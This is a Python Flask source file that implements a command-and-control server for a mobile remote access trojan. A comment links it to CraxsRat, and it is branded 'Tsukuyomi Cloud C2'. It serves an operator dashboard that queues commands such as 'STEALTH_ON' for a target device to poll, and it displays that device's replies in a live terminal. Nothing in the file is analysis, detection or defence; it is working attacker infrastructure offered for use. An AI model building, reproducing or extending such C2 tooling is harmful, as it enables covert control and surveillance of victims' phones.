from flask import Flask, jsonify, request

app = Flask(__name__)

current_command = ""
latest_response = "Waiting for target connection..."

# Unga full CraxsRat Mobile Admin UI HTML integrated with C2 Backend API
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tsukuyomi Mobile Admin Framework</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: {
                        sans: ['Inter', 'sans-serif'],
                        mono: ['JetBrains Mono', 'monospace'],
                    },
                    colors: {
                        cyber: {
                            dark: '#0a0d14',
                            card: '#121824',
                            border: '#1e293b',
                            accent: '#00f0ff',
                            purple: '#7000ff',
                            red: '#ff0055',
                            green: '#00ff88',
                            warning: '#ffaa00'
                        }
                    }
                }
            }
        }
    </script>
    <style>
        body { background-color: #07090e; color: #e2e8f0; font-family: 'Inter', sans-serif; user-select: none; overflow-x: hidden; }
        .glass-panel { background: rgba(18, 24, 36, 0.75); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.08); }
        .glass-card { background: rgba(30, 41, 59, 0.4); border: 1px solid rgba(255, 255, 255, 0.05); }
        ::-webkit-scrollbar { width: 4px; height: 4px; }
        ::-webkit-scrollbar-track { background: rgba(10, 13, 20, 0.5); }
        ::-webkit-scrollbar-thumb { background: #1e293b; border-radius: 4px; }
        @keyframes pulse-fast { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.95); } }
        .pulse-live { animation: pulse-fast 1.5s infinite ease-in-out; }
    </style>
</head>
<body class="min-h-screen pb-20 md:pb-6 flex flex-col items-center justify-start">

    <!-- Top App Navigation Bar -->
    <header class="w-full max-w-4xl glass-panel sticky top-0 z-50 px-4 py-3 border-b border-cyber-border/80 flex items-center justify-between">
        <div class="flex items-center space-x-3">
            <div class="relative flex items-center justify-center w-10 h-10 rounded-xl bg-gradient-to-tr from-cyber-purple to-cyber-accent text-slate-900 font-bold text-xl shadow-lg">
                <i class="fa-solid fa-spider text-slate-950 text-lg"></i>
                <span class="absolute -bottom-1 -right-1 w-3.5 h-3.5 bg-cyber-green rounded-full border-2 border-cyber-dark pulse-live"></span>
            </div>
            <div>
                <div class="flex items-center space-x-2">
                    <h1 class="font-mono font-bold text-base tracking-wider text-white">TSUKUYOMI</h1>
                    <span class="text-[10px] font-mono font-semibold px-2 py-0.5 rounded bg-cyber-accent/10 text-cyber-accent border border-cyber-accent/30">CLOUD C2 v7.4</span>
                </div>
                <p class="text-xs text-slate-400 font-mono">Status: <span class="text-cyber-green font-semibold">RELAY ONLINE</span></p>
            </div>
        </div>
    </header>

    <!-- Main Container -->
    <main class="w-full max-w-4xl px-3 sm:px-4 py-4 space-y-4 flex-grow">
        
        <!-- CONTROL HUB SECTION -->
        <section class="glass-panel p-4 rounded-2xl border border-cyber-border space-y-4">
            <h2 class="text-sm font-bold font-mono text-white uppercase tracking-wider flex items-center space-x-2">
                <i class="fa-solid fa-terminal text-cyber-accent"></i>
                <span>Live C2 Command & Telemetry Center</span>
            </h2>

            <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
                <div class="space-y-2">
                    <label class="text-xs text-slate-400 font-mono">Send Custom Command:</label>
                    <div class="flex space-x-2">
                        <input type="text" id="cmdInput" placeholder="STEALTH_ON, SHOW_TOAST..." class="flex-1 bg-cyber-dark border border-cyber-border px-3 py-2.5 rounded-xl text-white font-mono text-xs focus:outline-none focus:border-cyber-accent">
                        <button onclick="dispatchCommand()" class="px-4 py-2.5 bg-cyber-accent text-slate-950 font-mono font-bold text-xs rounded-xl hover:bg-cyan-300 transition">Send</button>
                    </div>
                </div>
                <div class="space-y-2">
                    <label class="text-xs text-slate-400 font-mono">Quick Hardware Triggers:</label>
                    <div class="grid grid-cols-2 gap-2">
                        <button onclick="sendPresetCmd('STEALTH_ON')" class="py-2.5 px-3 bg-cyber-dark hover:bg-cyber-card border border-cyber-border text-xs font-mono text-cyber-red rounded-xl">Stealth ON</button>
                        <button onclick="sendPresetCmd('STEALTH_OFF')" class="py-2.5 px-3 bg-cyber-dark hover:bg-cyber-card border border-cyber-border text-xs font-mono text-cyber-green rounded-xl">Stealth OFF</button>
                    </div>
                </div>
            </div>

            <div class="space-y-2 pt-2">
                <label class="text-xs text-slate-400 font-mono uppercase">Target Live Response Stream:</label>
                <div id="liveTerminal" class="h-48 bg-slate-950 p-4 rounded-xl border border-cyber-border font-mono text-xs text-cyber-green overflow-y-auto space-y-1">
                    <p class="text-slate-500">[SYSTEM] Connected to Tsukuyomi Cloud Relay...</p>
                </div>
            </div>
        </section>

    </main>

    <script>
        async function dispatchCommand() {
            const cmd = document.getElementById('cmdInput').value;
            if(!cmd) return;
            
            try {
                const res = await fetch('/api/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command: cmd })
                });
                const data = await res.json();
                appendLog(`[DISPATCHED] -> ${data.command}`, 'text-cyan-400');
                document.getElementById('cmdInput').value = '';
            } catch(e) {
                appendLog(`[ERROR] Dispatch failed`, 'text-red-400');
            }
        }

        function sendPresetCmd(cmdStr) {
            document.getElementById('cmdInput').value = cmdStr;
            dispatchCommand();
        }

        async function pollTargetResponse() {
            try {
                const res = await fetch('/api/response');
                const data = await res.json();
                if(data.response && data.response !== window.lastResponse) {
                    window.lastResponse = data.response;
                    appendLog(`[TARGET RESPONSE] -> ${data.response}`, 'text-cyber-green');
                }
            } catch(e) {}
        }
        setInterval(pollTargetResponse, 3000);

        function appendLog(text, colorClass) {
            const term = document.getElementById('liveTerminal');
            term.innerHTML += `<p class="${colorClass}">${text}</p>`;
            term.scrollTop = term.scrollHeight;
        }
    </script>
</body>
</html>
"""

@app.route("/")
def home():
    return HTML_TEMPLATE

@app.route('/api/command', methods=['GET', 'POST'])
def handle_command():
    global current_command
    if request.method == 'POST':
        data = request.get_json() or {}
        current_command = data.get('command', '')
        return jsonify({"status": "success", "command": current_command})
    cmd = current_command
    current_command = "" 
    return jsonify({"command": cmd})

@app.route('/api/response', methods=['GET', 'POST'])
def handle_response():
    global latest_response
    if request.method == 'POST':
        data = request.get_json() or {}
        latest_response = data.get('response', '')
        return jsonify({"status": "success"})
    return jsonify({"response": latest_response})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    
